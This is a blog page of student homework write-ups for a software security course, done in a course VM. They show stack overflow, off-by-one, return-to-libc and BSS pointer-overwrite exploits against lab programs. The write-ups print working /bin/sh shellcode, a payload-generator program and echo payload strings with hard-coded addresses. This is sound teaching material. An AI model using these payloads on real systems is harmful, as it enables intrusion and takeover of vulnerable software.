    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/15/SWS/Submission02/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Seven ♂">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.JPG">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Seven's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/15/SWS/Submission02/" itemprop="url">Submission02 of SWS</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-15T10:44:09+02:00">
                2020-05-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/theory/" itemprop="url" rel="index">
                    <span itemprop="name">theory</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Submission02-of-SWS"><a href="#Submission02-of-SWS" class="headerlink" title="Submission02 of SWS"></a>Submission02 of SWS</h2><h2 id="Xusong-Wang-3375907"><a href="#Xusong-Wang-3375907" class="headerlink" title="Xusong Wang 3375907"></a>Xusong Wang 3375907</h2><h2 id="Huicheng-Qian-3443114"><a href="#Huicheng-Qian-3443114" class="headerlink" title="Huicheng Qian 3443114"></a>Huicheng Qian 3443114</h2><h2 id="Shkodran-Abdullahu-3466256"><a href="#Shkodran-Abdullahu-3466256" class="headerlink" title="Shkodran Abdullahu 3466256"></a>Shkodran Abdullahu 3466256</h2><p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589066163/Screenshot_from_2020-05-10_01-14-58_jwd7vo.png" alt=""></p>
<p>We mimic the way from the example of lectures, insert a printf() as an assistant.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callme</span><span class="params">(<span class="keyword">char</span> *a)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> b[<span class="number">255</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Address of buffer in exploitable program: %08x\n"</span>, b); <span class="comment">//edited </span></span><br><span class="line">  <span class="built_in">strcpy</span>(b, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>After we compile the target file and execute, we get the 0xbffff759 , and we need to overflow the stack in order to overwrite the  return address , which aligned the 4-bytes to the address  0xbffff759. So we modifed  part of code from the example.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fill whole buffer with the target address, i=3 for align</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">3</span>; i &lt; bsize; i+=<span class="number">4</span>)</span><br><span class="line">  <span class="built_in">memcpy</span>(buff+i, &amp;addr, <span class="number">4</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589144743/VirtualBox_System_Security_VM_1_10_05_2020_23_04_18_hmw0i4.png" alt=""></p>
<p>Change the updated address 0xbffff369</p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589144743/VirtualBox_System_Security_VM_1_10_05_2020_23_05_05_ixx08h.png" alt=""></p>
<p>At last we got the shell.</p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589144743/VirtualBox_System_Security_VM_1_10_05_2020_23_05_25_aaixtc.png" alt=""></p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589066162/Screenshot_from_2020-05-10_01-14-39_xxpea8.png" alt=""></p>
<img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589066163/Screenshot_from_2020-05-10_01-14-49_nm8nlo.png" alt="-w70" style="zoom:67%;" />



<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589152125/VirtualBox_System_Security_VM_1_11_05_2020_01_08_11_f3otdb.png" alt=""></p>
<p>By gdb, we got the address of b[0] which we could update our input data. We reused the example to generate a string, which concludes the shellcode  and repeated b[0] address.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> shellcode[] = <span class="string">""</span></span><br><span class="line">  <span class="string">"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"</span></span><br><span class="line">  <span class="string">"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"</span></span><br><span class="line">  <span class="string">"\x80\xe8\xdc\xff\xff\xff/bin/sh"</span>;</span><br><span class="line"><span class="comment">// usage: exploit target-prog buffer-size target-addr</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">char</span> *buff, *ptr;</span><br><span class="line">  <span class="keyword">int</span> bsize = <span class="number">272</span>;</span><br><span class="line">  <span class="keyword">long</span> <span class="keyword">int</span> addr = <span class="number">0xbffff724</span>; <span class="comment">//the address of the b[0]</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Generating buffer with size %d and target address %08x\n"</span>, bsize, addr)</span><br><span class="line">  <span class="comment">// allocate buffer for exploit string</span></span><br><span class="line">  buff = <span class="built_in">malloc</span>(bsize);</span><br><span class="line">  <span class="comment">// fill whole buffer with the target address</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; bsize; i+=<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">memcpy</span>(buff+i, &amp;addr, <span class="number">4</span>);</span><br><span class="line">  <span class="comment">// put shellcode to the beginning of exploit string</span></span><br><span class="line">  <span class="built_in">memcpy</span>(buff, shellcode, <span class="built_in">strlen</span>(shellcode));</span><br><span class="line">  <span class="comment">// terminate string</span></span><br><span class="line">  buff[bsize - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">  <span class="comment">// print buffer</span></span><br><span class="line">	FILE* f;</span><br><span class="line">    f = fopen(<span class="string">"input"</span>, <span class="string">"w"</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(buff, f);</span><br><span class="line">	fclose(f);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>Below is what our input data file.</p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589152471/Screenshot_from_2020-05-11_01-14-11_osmqdu.png" alt=""></p>
<p>Reload into the target vulnerable program. Get the shell.</p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589146113/webwxgetmsgimg_picr9k.png" alt=""></p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589066162/Screenshot_from_2020-05-10_01-14-16_pqlfuj.png" alt=""></p>
<img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589066162/Screenshot_from_2020-05-10_01-14-27_iwhh8d.png" alt="zo" style="zoom:50%;" />

<p>The problem 3 is the similar to the problem1, but with limitation for a prefix ‘login=’ , we rewrote the shellcode with a prefix ‘login=’,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> shellcode[] = <span class="string">"login="</span></span><br><span class="line">  <span class="string">"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"</span></span><br><span class="line">  <span class="string">"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"</span></span><br><span class="line">  <span class="string">"\x80\xe8\xdc\xff\xff\xff/bin/sh"</span>;</span><br></pre></td></tr></table></figure>

<p>And we inserted some debugging codes into the target program in order to locate the address of str2.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span> <span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">char</span> str1[<span class="number">256</span>];</span><br><span class="line">  <span class="keyword">char</span> str2[<span class="number">512</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Address of buffer in str1 program: %08x\n"</span>, str1); <span class="comment">//edited </span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Address of buffer in str2 program: %08x\n"</span>, str2); <span class="comment">//edited </span></span><br><span class="line">  <span class="built_in">strcpy</span>(str2,str);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    str1[i] = str2[<span class="number">2</span>*i];</span><br><span class="line">  str1[<span class="number">255</span>] = <span class="string">'\0'</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, str1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>By the help of gdb, we located the address , since the real shell code begin after the ‘login=’, we should also plus 6 when assigning the repeated return address. For example, in our case, although address of str2 is 0xbffff144, we need to attempt to write 0xbffff14a to the return address.</p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589156595/VirtualBox_System_Security_VM_1_11_05_2020_02_13_31_p93oho.png" alt=""></p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589066162/Screenshot_from_2020-05-10_01-14-07_uhiodq.png" alt=""></p>
<blockquote>
<p> not solved, no find command available in gdb, failed to find the correct address of ‘bin/sh’</p>
</blockquote>
<p>Later updated: the address of the ‘bin/sh’ is found.</p>
<ol>
<li><p>finding the ‘bin/sh’ without ‘find’.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb)b main</span><br><span class="line">(gdb)r</span><br><span class="line">(gdb)info proc map</span><br></pre></td></tr></table></figure>

<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589200490/Screenshot_from_2020-05-11_14-25-29_ny8gib.png" alt=""></p>
<p>The address of ‘bin/sh’ should be between 0xb7e8f000 and 0xb7fd8000. Since ‘find’ is not available, we have to spent hours to find it manually(eg. x/10000s 0xb7e8f000) , finally it was found located at address 0xb7fbb3ce </p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589200490/Screenshot_from_2020-05-11_14-26-59_gcndkd.png" alt=""></p>
</li>
<li><p>finding address of system(), </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb)b main</span><br><span class="line">(gdb)r</span><br><span class="line">(gdb)p system</span><br></pre></td></tr></table></figure>

<p>System address 0xb7ec7990</p>
</li>
<li><p>Construct our ‘Return to libc’ overwritting buffer.</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> Relib[] = <span class="string">"AAAAAAAA"</span></span><br><span class="line">	<span class="string">"\x90\x79\xec\xb7"</span></span><br><span class="line">		<span class="string">"AAAA"</span></span><br><span class="line">	<span class="string">"\xce\xb3\xfb\xb7"</span>;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>got the shell</p>
<p>The address of b is start at 0xbffff7a4, </p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589200888/P4_vyezob.png" alt=""></p>
<ul>
<li>updated after the exercise session: we just need to cover start shellcode begun with some nops, and write the return address with the previous argument address.</li>
</ul>
</li>
</ol>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589066162/Screenshot_from_2020-05-10_01-13-31_wpuhor.png" alt=""></p>
<img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589066162/Screenshot_from_2020-05-10_01-13-58_xnve6i.png" style="zoom:50%;" />

<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th>char j[0]</th>
<th>char j[1]</th>
<th align="center">char j[2]</th>
</tr>
</thead>
<tbody><tr>
<td>0xbffff850</td>
<td>0xbffff851</td>
<td>0xbffff852</td>
<td>0xbffff853</td>
<td>0xbffff854</td>
<td>0xbffff855</td>
<td>0xbffff856</td>
<td align="center">0xbffff857</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td align="center"></td>
</tr>
<tr>
<td>int a</td>
<td>int a</td>
<td>int a</td>
<td>int a</td>
<td>int b</td>
<td>int b</td>
<td>int b</td>
<td align="center">int b</td>
</tr>
<tr>
<td>0xbffff858</td>
<td>0xbffff859</td>
<td>0xbffff85a</td>
<td>0xbffff85b</td>
<td>0xbffff85c</td>
<td>0xbffff85d</td>
<td>0xbffff85e</td>
<td align="center">0xbffff85f</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td align="center"></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td align="center"></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td>char c</td>
<td>int d</td>
<td>int d</td>
<td>int d</td>
<td align="center">int d</td>
</tr>
<tr>
<td>0xbffff860</td>
<td>0xbffff861</td>
<td>0xbffff862</td>
<td>0xbffff863</td>
<td>0xbffff864</td>
<td>0xbffff865</td>
<td>0xbffff866</td>
<td align="center">0xbffff867</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td align="center"></td>
</tr>
<tr>
<td></td>
<td></td>
<td>short e</td>
<td>short e</td>
<td>int f</td>
<td>int f</td>
<td>int f</td>
<td align="center">int f</td>
</tr>
<tr>
<td>0xbffff868</td>
<td>0xbffff869</td>
<td>0xbffff86a</td>
<td>0xbffff86b</td>
<td>0xbffff86c</td>
<td>0xbffff86d</td>
<td>0xbffff86e</td>
<td align="center">0xbffff86f</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td align="center"></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td align="center"></td>
</tr>
<tr>
<td></td>
<td>char g</td>
<td>short h</td>
<td>short h</td>
<td>int i</td>
<td>int i</td>
<td>int i</td>
<td align="center">int i</td>
</tr>
<tr>
<td>0xbffff870</td>
<td>0xbffff871</td>
<td>0xbffff872</td>
<td>0xbffff873</td>
<td>0xbffff874</td>
<td>0xbffff875</td>
<td>0xbffff876</td>
<td align="center">0xbffff877</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td align="center"></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td align="center"></td>
</tr>
<tr>
<td>int k</td>
<td>int k</td>
<td>int k</td>
<td>int k</td>
<td></td>
<td></td>
<td></td>
<td align="center"></td>
</tr>
<tr>
<td>0xbffff878</td>
<td>0xbffff879</td>
<td>0xbffff87a</td>
<td>0xbffff87b</td>
<td>0xbffff87c</td>
<td>0xbffff87d</td>
<td>0xbffff87e</td>
<td align="center">0xbffff87f</td>
</tr>
</tbody></table>
<p>The figure above is right after all the variables are declared, that is a breakpoint before the line 14.</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/15/SWS/Submission03/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Seven ♂">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.JPG">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Seven's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/15/SWS/Submission03/" itemprop="url">Submission03 of SWS</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-15T10:44:09+02:00">
                2020-05-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/theory/" itemprop="url" rel="index">
                    <span itemprop="name">theory</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Submission03-of-SWS"><a href="#Submission03-of-SWS" class="headerlink" title="Submission03 of SWS"></a>Submission03 of SWS</h2><h2 id="Xusong-Wang-3375907"><a href="#Xusong-Wang-3375907" class="headerlink" title="Xusong Wang 3375907"></a>Xusong Wang 3375907</h2><h2 id="Huicheng-Qian-3443114"><a href="#Huicheng-Qian-3443114" class="headerlink" title="Huicheng Qian 3443114"></a>Huicheng Qian 3443114</h2><h2 id="Shkodran-Abdullahu-3466256"><a href="#Shkodran-Abdullahu-3466256" class="headerlink" title="Shkodran Abdullahu 3466256"></a>Shkodran Abdullahu 3466256</h2><p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589555954/sws-homework-03-page-002_avhnuq.jpg" alt=""></p>
<p>Considering the data on the buffer is generated by sof-exploit-reverse-exploit and unchangable, and the argv[1] which includes the return address is only 4 bytes, we need to design a stack, whose return address is able to surely covered by argv[1],  the easiest way to creat a code which meet the requirement successfully is shown below:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span> <span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> b[<span class="number">64</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"address of b[] is @ %08x\n"</span>,b);</span><br><span class="line">  <span class="built_in">strcpy</span>(b,str);  &#125;</span><br><span class="line">	<span class="comment">// put your code here</span></span><br></pre></td></tr></table></figure>

<p>A local variable with width 64bytes, which is followed the old frame poiter with 4 byte, could be just exploited by our sof-exploit-reverse-exploit.</p>
<img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589563791/p1-2_jn8nv2.png" alt="e" style="zoom:80%;" />

<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589563492/p1_i3bjob.png" alt=""></p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589555953/sws-homework-03-page-003_e7d1fq.jpg" alt=""></p>
<p>What we should do is that to change the value of the saved based pointer of function b, make it to point an address just one word below the location where start address of shellcode is.</p>
<img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589587744/Screenshot_2020-05-16_02-07-54_jic9un.png" alt="c" style="zoom:100%;" />

<p>According the known information:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Shellcode at: 0x80496c0</span><br><span class="line">Address of buffer in exploitable program: 0xbffff798</span><br><span class="line">Framepointer before copy: bffff7c8</span><br></pre></td></tr></table></figure>

<p>We change the  value of the saved based pointer of function b to 0xbffff798, where is the start address of buffer. Then we need to put start address of shellcode at 0xbffff79c, at last our construction string is shown as below</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(<span class="built_in">echo</span> -e <span class="string">"aaaa\xc0\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaa\x98"</span>)</span></span><br></pre></td></tr></table></figure>

<p>Got the shell.</p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589588117/Screenshot_2020-05-16_02-14-55_okxth7.png" alt=""></p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589625612/Screenshot_2020-05-16_12-39-35_wi2ou0.png" alt=""></p>
<p>From the previous problem, we are able to attack by using the return to libc. According to the previous explanation, since we already control the return address, we could assign the return address with the address of system function, and put the address of “bin/bash” at a distance of 4 bytes, the figure shown as below:</p>
<img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589648099/Screenshot_2020-05-16_18-54-38_h4tm9a.png" alt="e" style="zoom:67%;" /> 

<p>By invoking the system function, we could pass ‘bin/bash’ to it as an argument, so we should construct our payload like this:     |dummy + address of system + dummy + address of “/bin/sh” + dummy|, but we still need to find out the address of “bin/sh” and  system.</p>
<ol>
<li><p>finding the ‘bin/sh’.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb)b main</span><br><span class="line">(gdb)r</span><br><span class="line">(gdb)info proc map</span><br></pre></td></tr></table></figure>

<p>The address of ‘bin/sh’ should be between 0xb7e8f000 and 0xb7fd8000. Since ‘find’ is not available, we have to spent some time to find it manually(eg. x/10000s 0xb7e8f000) , finally it was found located at address 0xb7fbb3ce </p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589648770/Screenshot_2020-05-16_19-04-19_o7agqn.png" alt=""></p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589648770/Screenshot_2020-05-16_19-04-41_nt97ux.png" alt=""></p>
<p>address of “/bin/sh”  0xb7fbb3ce</p>
</li>
<li><p>finding address of system(), </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb)b main</span><br><span class="line">(gdb)r</span><br><span class="line">(gdb)p system</span><br></pre></td></tr></table></figure>

<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589648770/Screenshot_2020-05-16_19-05-22_i06izw.png" alt=""></p>
<p>System address 0xb7ec7990</p>
</li>
<li><p>Construct our payload and get the shell.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">isuser@ubuntu:/mnt/homework03/p3$ ./obo-exploit-1-target   $(echo -e "aaaa\x90\x79\xec\xb7aaaa\xce\xb3\xfb\xb7aaaaaaaaaaaaaaaa\x98"&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589648770/Screenshot_2020-05-16_19-05-46_rt1h0t.png" alt=""></p>
</li>
</ol>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589625612/Screenshot_2020-05-16_12-39-43_h1pl8e.png" alt=""></p>
<p>Because error_handler points to the function of print_error ,buf[12] is in the BSS segment, which right next to the error_handler, we could overwrite the buf[12] and error_handler by designed payload , which starts with 12 times nop, then a address point to shell code, at last the shellcode, as below:</p>
<img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589746300/1_coc2we.png" alt="e" style="zoom:150%;" />

<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589625612/Screenshot_2020-05-16_12-39-49_lgmewq.png" alt=""></p>
<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589555953/sws-homework-03-page-005_dbn8nb.jpg" alt=""></p>
<p>| Step | printf-internal | printf-internal | Output    |<br>|      | loop pointer    | stack pointer   | up to now |<br>|——+—————–+—————–+—————-|<br>|    0 | 0812ff02        | bffff544        | (empty)       |<br>|    1 | 0812ff03        | bffff544        |    a              |<br>|    2 | 0812ff04        | bffff544        |    ab            |<br>|    3 | 0812ff05        | bffff544        |    abc          |<br>|    4 | 0812ff06        | bffff544        |    abc          |<br>|    5 | 0812ff07        | bffff548        |    abc66      |<br>|    6 | 0812ff08        | bffff548        |    abc66x    |<br>|    7 | 0812ff09        | bffff548        |    abc66xy  |<br>|    8 | 0812ff0a        | bffff548        |    abc66xy  |<br>|    9 | 0812ff0b        | bffff54c        |    abc66xyFoobar|</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/14/SWS/SWS_Notes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Seven ♂">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.JPG">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Seven's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/14/SWS/SWS_Notes/" itemprop="url">SWS_Notes</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-14T10:44:09+02:00">
                2020-05-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/theory/" itemprop="url" rel="index">
                    <span itemprop="name">theory</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="1-Buffer-overflow"><a href="#1-Buffer-overflow" class="headerlink" title="1. Buffer overflow"></a>1. Buffer overflow</h1><h2 id="1-3-Format-String"><a href="#1-3-Format-String" class="headerlink" title="1.3 Format String"></a>1.3 Format String</h2><h3 id="1-3-1-Condition"><a href="#1-3-1-Condition" class="headerlink" title="1.3.1 Condition"></a>1.3.1 Condition</h3><p>IF Attacker is able to provide the format string to an ANSI C format function, a format string vulnerability is present.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Wrong  he can control the entire ASCIIZ-string</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span> <span class="params">(<span class="keyword">char</span> *user)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span> (user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

